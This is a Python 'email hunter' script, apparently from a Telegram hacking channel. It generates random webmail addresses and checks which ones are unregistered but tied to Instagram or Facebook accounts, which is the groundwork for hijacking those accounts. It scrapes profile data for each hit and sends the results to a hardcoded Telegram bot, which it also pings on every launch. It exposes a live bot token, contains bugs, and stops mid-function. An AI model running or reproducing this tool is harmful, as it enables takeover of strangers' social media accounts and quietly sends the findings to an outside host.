import os , time , sys , random,requests
def cls():
 os.system('cls' if os.name == 'nt' else 'clear')
try:
	from gdolib import *
	import requests ,webbrowser 
	from faker import Faker
except ImportError:
	os.system('pip install requests')
	os.system('pip install gdolib')
	os.system('pip install webbrowser')
	os.system('pip install faker')	
	os.system('clear')
cls()
#-----------[ Colors ]-----------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
E = "\033[0;90m" #رمادي
r = "1234567890"
#------------------------------[Start CoDe]------------------------------
print(Z+'━'*25)
azooz=f" {X}« {C}Welcome To {X}𝕄ℝ𝕏 {C}Tool {X}»"
print(azooz)
print(Z+'━'*25)
def pas():
	 J = '7'
	 e = "7"
	 if J in e:
	 	print(F+"\n  ♔︎ GOOD LUCK ♔︎ ")
	 	time.sleep(1)
	 	os.system('clear')
	 else:
	 	print(Z+'  ERORR BRO ')
	 	pas()
pas()
def azz():
	gdo0 =(f"""{X}                                                        
    """)
	azro = (f"""
    {C}Script Hunter Emails
{Z}┏━━━━━━━━━━━━━━━━━┓           
{X}┃{C} ⌯ Channel {Z}›{C} @vvvvvfvv{X}     ┃  
{Z}┗━━━━━━━━━━━━━━━━━┛               """)
	for azoz in gdo0.splitlines():
		time.sleep(0.05)
		print(azoz)
	for azr in azro.splitlines():
		time.sleep(0.05)
		print(azr)
azz()


token = '5445411525:AAGpa2wd1eyvQ8srS28AjAdMygwPz5ggE-o'
ID = '2074849912'
print(f" {C}---------------------- ")
start_msg = requests.post(f"""https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=• 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝙶𝙳𝙾 𝚃𝙾𝙾𝙻 •
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ DIV › @M_9_5_A
⌯ 𝙲𝙰𝙷𝙽𝙽𝙴𝙻 › @vvvvvfvv .""")

def ginsta():
 while True:
 	url = 'https://randommer.io/random-email-address'
 	headers = {
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-length': '239',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
        'origin': 'https://randommer.io',
        'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(gdo_drow.get_user_agent()),
        'x-requested-with': 'XMLHttpRequest'}
	
 	data = {
        'number': "1000",
        'culture': 'en_US',
        '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
        'X-Requested-With': 'XMLHttpRequest'}
 	req = requests.post(url, headers=headers, data=data).text
 	data = req.replace('[','').replace(']','').split(',')
 	for i in data:
 		eail = i.replace('"','')
 		u = str("".join(random.choice(r)for i in range(4)))
 		n0 = names.get_first_name(gender='male')
 		n1 = names.get_first_name()
 		n2 = names.get_first_name(gender='femal')
 		pa2 = n0 + u 
 		pa3 = n1 + u 
 		pa4 = n2 + u 
 		ema1 = eail.split("@")[0]
 		ema = Faker().email().split("@")[0]
 		em = (n0,n1,n2,ema,ema1,pa2,pa3,pa4)
 		emil = random.choice(em)
 		email = emil + "@gmail.com"
 		with open("Gmail.txt",'a') as d:
 			d.write(email+"\n")
 		gmail = Azoz_check_email.gmail(email)
 		if gmail['email'] == True:
 		 	insta = Azoz_check_email.instagram(str(email))
 		 	if insta['status'] == 'Success':
 		 		print(f"{F} • GooD Instagram » {F}{email} ")
 		 		try:
 		 			user = email.split("@")[0]
 		 			name = str(info_IG.name(user))
 		 			idd = int(info_IG.id(user))
 		 			bio = str(info_IG.bio(user))
 		 			followers = str(info_IG.followers(user))
 		 			following = str(info_IG.following(user))
 		 			isp = str(info_IG.private(user))
 		 			posts = str(info_IG.posts(user))
 		 			pro = str(info_IG.profile(user))
 		 			date = str(info_IG.date(user))
 		 			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝕄ℝ𝕏 ⌯
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ɴᴀᴍᴇ » {name}
⌯ ᴜsᴇʀɴᴀᴍᴇ » {user}
⌯ ᴇᴍᴀɪʟ » {email}
⌯ ғᴏʟʟᴏᴡᴇʀs » {followers}
⌯ ғᴏʟʟᴏᴡɪɴɢ » {following}
⌯ ᴅᴀᴛᴇ » {date}
⌯ ɪᴅ » {id}
⌯ ᴘᴏsᴛs » {posts}
⌯ ᴘʀɪvᴀᴛᴇ » {isp}
⌯ ʙɪᴏ » {bio}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @GDO00 - @GDO_0 .""")

 		 		except:
 		 			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝕄ℝ𝕏 ⌯
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ᴇᴍᴀɪʟ » {email}
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @vvvvvfvv .""")
 		 	else:
 		 		print(f'{X}• BaD Instagram » {email} ')
 		else:
 			print(f"{Z}▩ 𝙱𝙰𝙳 Gmail » {email} ")
 
 
 
 
def gface():
 while True:
 	url = 'https://randommer.io/random-email-address'
 	headers = {
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-length': '239',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
        'origin': 'https://randommer.io',
        'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(gdo_drow.get_user_agent()),
        'x-requested-with': 'XMLHttpRequest'}
	
 	data = {
        'number': "1000",
        'culture': 'en_US',
        '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
        'X-Requested-With': 'XMLHttpRequest'}
 	req = requests.post(url, headers=headers, data=data).text
 	data = req.replace('[','').replace(']','').split(',')
 	for i in data:
 		eail = i.replace('"','')
 		u = str("".join(random.choice(r)for i in range(4)))
 		n0 = names.get_first_name(gender='male')
 		n1 = names.get_first_name()
 		n2 = names.get_first_name(gender='femal')
 		pa2 = n0 + u 
 		pa3 = n1 + u 
 		pa4 = n2 + u 
 		ema1 = eail.split("@")[0]
 		ema = Faker().email().split("@")[0]
 		em = (n0,n1,n2,ema,ema1,pa2,pa3,pa4)
 		emil = random.choice(em)
 		email = emil + "@gmail.com"
 		with open("Gmail.txt",'a') as d:
 			d.write(email+"\n")
 		gmail = Azoz_check_email.gmail(email)
 		if gmail['email'] == True:
 			face = Azoz_check_email.facebook(email)
 			if face['status']=='Success':
 				ht += 1
 				requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ғᴀcᴇ ʙʏ 𝕄ℝ𝕏 ⌯ 
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ᴇᴍᴀɪʟ » {email}
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @vvvvvfvv - @GDO_0 .""")

 			else:
 				print(f'{X}• BaD Facebook » {email} ')
 		else:
 			print(f"{Z}▩ 𝙱𝙰𝙳 Gmail » {email} ")
 			
 			
def yinsta():
 while True:
 	url = 'https://randommer.io/random-email-address'
 	headers = {
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-length': '239',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
        'origin': 'https://randommer.io',
        'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(gdo_drow.get_user_agent()),
        'x-requested-with': 'XMLHttpRequest'}
	
 	data = {
        'number': "1000",
        'culture': 'en_US',
        '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
        'X-Requested-With': 'XMLHttpRequest'}
 	req = requests.post(url, headers=headers, data=data).text
 	data = req.replace('[','').replace(']','').split(',')
 	for i in data:
 		eail = i.replace('"','')
 		u = str("".join(random.choice(r)for i in range(4)))
 		n0 = names.get_first_name(gender='male')
 		n1 = names.get_first_name()
 		n2 = names.get_first_name(gender='femal')
 		pa2 = n0 + u 
 		pa3 = n1 + u 
 		pa4 = n2 + u 
 		ema1 = eail.split("@")[0]
 		ema = Faker().email().split("@")[0]
 		em = (n0,n1,n2,ema,ema1,pa2,pa3,pa4)
 		emil = random.choice(em)
 		email = emil + "@yahoo.com"
 		with open("Yahoo.txt",'a') as d:
 			d.write(email+"\n")
 		gmail = Azoz_check_email.yahoo(email)
 		if gmail['email'] == True:
 		 	insta = Azoz_check_email.instagram(str(email))
 		 	if insta['status'] == 'Success':
 		 		print(f"{F} • GooD Instagram » {F}{email} ")
 		 		try:
 		 			user = email.split("@")[0]
 		 			name = str(info_IG.name(user))
 		 			idd = int(info_IG.id(user))
 		 			bio = str(info_IG.bio(user))
 		 			followers = str(info_IG.followers(user))
 		 			following = str(info_IG.following(user))
 		 			isp = str(info_IG.private(user))
 		 			posts = str(info_IG.posts(user))
 		 			pro = str(info_IG.profile(user))
 		 			date = str(info_IG.date(user))
 		 			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝕄ℝ𝕏 ⌯
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ɴᴀᴍᴇ » {name}
⌯ ᴜsᴇʀɴᴀᴍᴇ » {user}
⌯ ᴇᴍᴀɪʟ » {email}
⌯ ғᴏʟʟᴏᴡᴇʀs » {followers}
⌯ ғᴏʟʟᴏᴡɪɴɢ » {following}
⌯ ᴅᴀᴛᴇ » {date}
⌯ ɪᴅ » {id}
⌯ ᴘᴏsᴛs » {posts}
⌯ ᴘʀɪvᴀᴛᴇ » {isp}
⌯ ʙɪᴏ » {bio}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @GDO00 - @GDO_0 .""")

 		 		except:
 		 			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝕄ℝ𝕏 ⌯
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ᴇᴍᴀɪʟ » {email}
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @vvvvvfvv .""")
 		 	else:
 		 		print(f'{X}• BaD Instagram » {email} ')
 		else:
 			print(f"{Z}▩ 𝙱𝙰𝙳 Yahoo » {email} ")




def yface():
 while True:
 	url = 'https://randommer.io/random-email-address'
 	headers = {
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-length': '239',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
        'origin': 'https://randommer.io',
        'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(gdo_drow.get_user_agent()),
        'x-requested-with': 'XMLHttpRequest'}
	
 	data = {
        'number': "1000",
        'culture': 'en_US',
        '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
        'X-Requested-With': 'XMLHttpRequest'}
 	req = requests.post(url, headers=headers, data=data).text
 	data = req.replace('[','').replace(']','').split(',')
 	for i in data:
 		eail = i.replace('"','')
 		u = str("".join(random.choice(r)for i in range(4)))
 		n0 = names.get_first_name(gender='male')
 		n1 = names.get_first_name()
 		n2 = names.get_first_name(gender='femal')
 		pa2 = n0 + u 
 		pa3 = n1 + u 
 		pa4 = n2 + u 
 		ema1 = eail.split("@")[0]
 		ema = Faker().email().split("@")[0]
 		em = (n0,n1,n2,ema,ema1,pa2,pa3,pa4)
 		emil = random.choice(em)
 		email = emil + "@yahoo.com"
 		with open("yahoo.txt",'a') as d:
 			d.write(email+"\n")
 		gmail = Azoz_check_email.yahoo(email)
 		if gmail['email'] == True:
 			face = Azoz_check_email.facebook(email)
 			if face['status']=='Success':
 				ht += 1
 				requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ғᴀcᴇ ʙʏ 𝕄ℝ𝕏 ⌯ 
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ᴇᴍᴀɪʟ » {email}
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @vvvvvfvv - @GDO_0 .""")

 			else:
 				print(f'{X}• BaD Facbook » {email} ')
 		else:
 			print(f"{Z}▩ 𝙱𝙰𝙳 Yahoo » {email} ")


def ainsta():
 while True:
 	url = 'https://randommer.io/random-email-address'
 	headers = {
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-length': '239',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
        'origin': 'https://randommer.io',
        'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(gdo_drow.get_user_agent()),
        'x-requested-with': 'XMLHttpRequest'}
	
 	data = {
        'number': "1000",
        'culture': 'en_US',
        '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
        'X-Requested-With': 'XMLHttpRequest'}
 	req = requests.post(url, headers=headers, data=data).text
 	data = req.replace('[','').replace(']','').split(',')
 	for i in data:
 		eail = i.replace('"','')
 		u = str("".join(random.choice(r)for i in range(4)))
 		n0 = names.get_first_name(gender='male')
 		n1 = names.get_first_name()
 		n2 = names.get_first_name(gender='femal')
 		pa2 = n0 + u 
 		pa3 = n1 + u 
 		pa4 = n2 + u 
 		ema1 = eail.split("@")[0]
 		ema = Faker().email().split("@")[0]
 		em = (n0,n1,n2,ema,ema1,pa2,pa3,pa4)
 		emil = random.choice(em)
 		email = emil + "@aol.com"
 		with open("aol.txt",'a') as d:
 			d.write(email+"\n")
 		gmail = Azoz_check_email.aol(email)
 		if gmail['email'] == True:
 		 	insta = Azoz_check_email.instagram(str(email))
 		 	if insta['status'] == 'Success':
 		 		print(f"{F} • GooD Instagram » {F}{email} ")
 		 		try:
 		 			user = email.split("@")[0]
 		 			name = str(info_IG.name(user))
 		 			idd = int(info_IG.id(user))
 		 			bio = str(info_IG.bio(user))
 		 			followers = str(info_IG.followers(user))
 		 			following = str(info_IG.following(user))
 		 			isp = str(info_IG.private(user))
 		 			posts = str(info_IG.posts(user))
 		 			pro = str(info_IG.profile(user))
 		 			date = str(info_IG.date(user))
 		 			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝕄ℝ𝕏 ⌯
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ɴᴀᴍᴇ » {name}
⌯ ᴜsᴇʀɴᴀᴍᴇ » {user}
⌯ ᴇᴍᴀɪʟ » {email}
⌯ ғᴏʟʟᴏᴡᴇʀs » {followers}
⌯ ғᴏʟʟᴏᴡɪɴɢ » {following}
⌯ ᴅᴀᴛᴇ » {date}
⌯ ɪᴅ » {id}
⌯ ᴘᴏsᴛs » {posts}
⌯ ᴘʀɪvᴀᴛᴇ » {isp}
⌯ ʙɪᴏ » {bio}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @GDO00 - @GDO_0 .""")

 		 		except:
 		 			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝕄ℝ𝕏 ⌯
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ᴇᴍᴀɪʟ » {email}
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @vvvvvfvv .""")
 		 	else:
 		 		print(f'{X}• BaD Instagram » {email} ')
 		else:
 			print(f"{Z}▩ 𝙱𝙰𝙳 Aol » {email} ")


def aface():
 while True:
 	url = 'https://randommer.io/random-email-address'
 	headers = {
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-length': '239',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
        'origin': 'https://randommer.io',
        'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(gdo_drow.get_user_agent()),
        'x-requested-with': 'XMLHttpRequest'}
	
 	data = {
        'number': "1000",
        'culture': 'en_US',
        '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
        'X-Requested-With': 'XMLHttpRequest'}
 	req = requests.post(url, headers=headers, data=data).text
 	data = req.replace('[','').replace(']','').split(',')
 	for i in data:
 		eail = i.replace('"','')
 		u = str("".join(random.choice(r)for i in range(4)))
 		n0 = names.get_first_name(gender='male')
 		n1 = names.get_first_name()
 		n2 = names.get_first_name(gender='femal')
 		pa2 = n0 + u 
 		pa3 = n1 + u 
 		pa4 = n2 + u 
 		ema1 = eail.split("@")[0]
 		ema = Faker().email().split("@")[0]
 		em = (n0,n1,n2,ema,ema1,pa2,pa3,pa4)
 		emil = random.choice(em)
 		email = emil + "@aol.com"
 		with open("aol.txt",'a') as d:
 			d.write(email+"\n")
 		gmail = Azoz_check_email.aol(email)
 		if gmail['email'] == True:
 			face = Azoz_check_email.facebook(email)
 			if face['status']=='Success':
 				ht += 1
 				requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ғᴀcᴇ ʙʏ 𝕄ℝ𝕏 ⌯ 
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ᴇᴍᴀɪʟ » {email}
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @vvvvvfvv - @GDO_0 .""")

 			else:
 				print(f'{X}• BaD Facbook » {email} ')
 		else:
 			print(f"{Z}▩ 𝙱𝙰𝙳 Aol » {email} ")


def minsta():
 while True:
 	url = 'https://randommer.io/random-email-address'
 	headers = {
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-length': '239',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
        'origin': 'https://randommer.io',
        'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(gdo_drow.get_user_agent()),
        'x-requested-with': 'XMLHttpRequest'}
	
 	data = {
        'number': "1000",
        'culture': 'en_US',
        '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
        'X-Requested-With': 'XMLHttpRequest'}
 	req = requests.post(url, headers=headers, data=data).text
 	data = req.replace('[','').replace(']','').split(',')
 	for i in data:
 		eail = i.replace('"','')
 		u = str("".join(random.choice(r)for i in range(4)))
 		n0 = names.get_first_name(gender='male')
 		n1 = names.get_first_name()
 		n2 = names.get_first_name(gender='femal')
 		pa2 = n0 + u 
 		pa3 = n1 + u 
 		pa4 = n2 + u 
 		ema1 = eail.split("@")[0]
 		ema = Faker().email().split("@")[0]
 		em = (n0,n1,n2,ema,ema1,pa2,pa3,pa4)
 		emil = random.choice(em)
 		email = emil + "@mail.ru"
 		with open("mail_ru.txt",'a') as d:
 			d.write(email+"\n")
 		gmail = Azoz_check_email.mailru(email)
 		if gmail['email'] == True:
 		 	insta = Azoz_check_email.instagram(str(email))
 		 	if insta['status'] == 'Success':
 		 		print(f"{F} • GooD Instagram » {F}{email} ")
 		 		try:
 		 			user = email.split("@")[0]
 		 			name = str(info_IG.name(user))
 		 			idd = int(info_IG.id(user))
 		 			bio = str(info_IG.bio(user))
 		 			followers = str(info_IG.followers(user))
 		 			following = str(info_IG.following(user))
 		 			isp = str(info_IG.private(user))
 		 			posts = str(info_IG.posts(user))
 		 			pro = str(info_IG.profile(user))
 		 			date = str(info_IG.date(user))
 		 			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝕄ℝ𝕏 ⌯
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ɴᴀᴍᴇ » {name}
⌯ ᴜsᴇʀɴᴀᴍᴇ » {user}
⌯ ᴇᴍᴀɪʟ » {email}
⌯ ғᴏʟʟᴏᴡᴇʀs » {followers}
⌯ ғᴏʟʟᴏᴡɪɴɢ » {following}
⌯ ᴅᴀᴛᴇ » {date}
⌯ ɪᴅ » {id}
⌯ ᴘᴏsᴛs » {posts}
⌯ ᴘʀɪvᴀᴛᴇ » {isp}
⌯ ʙɪᴏ » {bio}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @GDO00 - @GDO_0 .""")

 		 		except:
 		 			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝕄ℝ𝕏 ⌯
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ᴇᴍᴀɪʟ » {email}
• ━ ━━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @vvvvvfvv .""")
 		 	else:
 		 		print(f'{X}• BaD Instagram » {email} ')
 		else:
 			print(f"{Z}▩ 𝙱𝙰𝙳 Mail.ru » {email} ")


def mface():
 while True:
 	url = 'https://randommer.io/random-email-address'
 	headers = {
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-length': '239',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '.AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8DJ-g9FHSSxClzJ5QJouzeI7-q_vZxCnhkeFlGapcHZgJbZ-aP87NSgO15EqlMTNlpWsrTtDK8Qo_FkcelUen-XMHT8ZaUCFeGiAhGS8O7Ny-7XLvjZQza8gyEX141ln397mg-FwkxUmh8CBjHv4QKw',
        'origin': 'https://randommer.io',
        'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': str(gdo_drow.get_user_agent()),
        'x-requested-with': 'XMLHttpRequest'}
	
 	data = {
        'number': "1000",
        'culture': 'en_US',
        '__RequestVerificationToken': 'CfDJ8DJ-g9FHSSxClzJ5QJouzeLi6tSHIeSyq6LHD-lqesWRBHZhI32LFnxMH163TgAQwwE7dRIDYclgxYfDODEZgqrDwuegjkOko7L88MqV4BLhOsmSdGm9gFbDalgtuV6lb3bhat9gHttOROyeP72M4aw',
        'X-Requested-With': 'XMLHttpRequest'}
 	req = requests.post(url, headers=headers, data=data).text
